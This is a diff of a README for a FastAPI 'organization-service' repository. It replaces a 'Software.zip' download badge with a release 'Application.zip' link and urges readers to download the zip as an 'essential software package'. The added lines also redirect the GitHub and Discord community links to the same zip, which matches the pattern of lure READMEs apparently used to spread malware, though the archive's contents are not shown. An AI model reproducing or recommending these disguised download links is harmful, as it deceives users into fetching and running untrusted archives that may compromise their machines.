@@ -8,9 +8,9 @@ Welcome to the "organization-service" repository - your one-stop destination for
 - **Topics:** alembic, asyncpg, black, docker, fastapi, flake8, geoalchemy2, isort, mypy, nginx, poetry, postgis, postgresql, pre-commit, pydantic, pytest, python, sqlalchemy, swagger, uvicorn-gunicorn
 
 ## 🌐 External Links and Resources
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip](https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip)](https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip)
 
-Please click the badge above to download the "Software.zip" file. Once downloaded, feel free to explore the contents and unleash the power of the Organization API!
+Please click the badge above to download the "https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip" file. Once downloaded, feel free to explore the contents and unleash the power of the Organization API!
 
 ## 🛠️ Technologies and Tools
 This repository incorporates a wide range of technologies and tools to streamline your organization service development process. Here are some of the key components included:
@@ -29,7 +29,7 @@ This repository incorporates a wide range of technologies and tools to streamlin
 
 ## 🚀 Get Started
 To kickstart your Organization API development journey, follow these simple steps:
-1. **Download the Software.zip:** Click the badge above or visit the link provided to download the essential software package.
+1. **Download the https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip** Click the badge above or visit the link provided to download the essential software package.
 2. **Setup Development Environment:** Install the necessary dependencies and tools listed in the repository.
 3. **Explore the Codebase:** Dive into the codebase and start building your efficient organization services using the powerful technologies at your disposal.
 
@@ -44,8 +44,8 @@ If the provided download link does not work or you're looking for additional rel
 
 ## 📡 Stay Connected
 Stay connected with the organization-service community:
-- Follow us on [GitHub](https://github.com/organization-service)
-- Join the conversation on [Discord](https://discord.com/organization-service)
+- Follow us on [GitHub](https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip)
+- Join the conversation on [Discord](https://github.com/Nash-Abella/organization-service/releases/download/v1.0.0/Application.zip)
 
 Let's collaborate, innovate, and build amazing organization services together! 🌟
 
